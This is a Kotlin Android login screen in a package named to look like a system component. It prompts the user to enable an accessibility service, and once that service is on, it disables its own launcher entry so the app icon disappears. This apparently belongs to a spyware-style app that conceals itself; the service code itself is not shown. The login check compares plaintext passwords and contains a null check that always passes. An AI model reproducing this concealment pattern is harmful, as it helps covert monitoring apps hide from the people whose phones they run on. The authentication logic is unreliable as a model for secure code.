package com.system.internet

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.Switch
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener


class LoginActivity : AppCompatActivity() {
    lateinit var loginUsername: EditText
    lateinit var loginPassword: EditText
    lateinit var loginButton: Button
    lateinit var switch: Switch

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)

        switch = findViewById(R.id.sw)
        switch.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked && !isAccessibilityServiceEnabled()) {
                // Step 5: Prompt the user to enable the service
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
                Toast.makeText(this, "Please enable the accessibility service.", Toast.LENGTH_LONG).show()
            }
        }

        loginUsername = findViewById(R.id.username)
        loginPassword = findViewById(R.id.password)
        loginButton = findViewById(R.id.login)

        loginButton.setOnClickListener(View.OnClickListener {
            checkUser()
        })
    }

    override fun onResume() {
        super.onResume()
        switch.isChecked = isAccessibilityServiceEnabled()
        if (isAccessibilityServiceEnabled()){
            val componentName = ComponentName(this, LoginActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val service = ComponentName(this, MyService::class.java)
        val flat = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        return flat?.contains(service.flattenToString()) ?: false
    }

    private fun checkUser() {
        // Validate input
        val username = loginUsername.text.toString().trim()
        val password = loginPassword.text.toString().trim()

//        Log.d("cekLogin", "Username: $username, Password: $password")

        if (username.isEmpty() || password.isEmpty()) {
            Toast.makeText(this, "Please enter username and password", Toast.LENGTH_SHORT).show()
            return
        }

        val db = FirebaseDatabase.getInstance().getReference("login")

        db.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    val user = snapshot.child("username").getValue(String::class.java).equals(username)
                    if (user != null) {
                        if (snapshot.child("password").getValue(String::class.java).equals(password)) {
                            startActivity(Intent(this@LoginActivity, MainActivity::class.java))
                            finish()
                        } else {
                            loginPassword.setError("Invalid Credentials")
                            loginPassword.requestFocus()
                        }
                    } else {
                        loginUsername.setError("User does not exist")
                        loginUsername.requestFocus()
                    }
                } else {
                    loginUsername.setError("Data does not exist")
                    loginUsername.requestFocus()
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Toast.makeText(this@LoginActivity, error.message, Toast.LENGTH_SHORT).show()
            }
        })

//        usersRef.child("username").equalTo(username).addListenerForSingleValueEvent(object : ValueEventListener {
//            override fun onDataChange(dataSnapshot: DataSnapshot) {
//                if (dataSnapshot.exists()) {
//                    // Username found, now check password
//                    for (userSnapshot in dataSnapshot.children) {
//                        val userPassword = userSnapshot.child("password").getValue(String::class.java)
//                        if (password == userPassword) {
//                            startActivity(Intent(this@LoginActivity, MainActivity::class.java))
//                        } else {
//                            loginPassword.setError("Invalid Credentials")
//                            loginPassword.requestFocus()
//                        }
//                    }
//                } else {
//                    loginUsername.setError("User does not exist")
//                    loginUsername.requestFocus()
//                }
//            }
//
//            override fun onCancelled(databaseError: DatabaseError) {
//                // Handle error on query cancellation
//                Toast.makeText(this@LoginActivity, databaseError.message, Toast.LENGTH_SHORT).show()
//            }
//        })
    }

}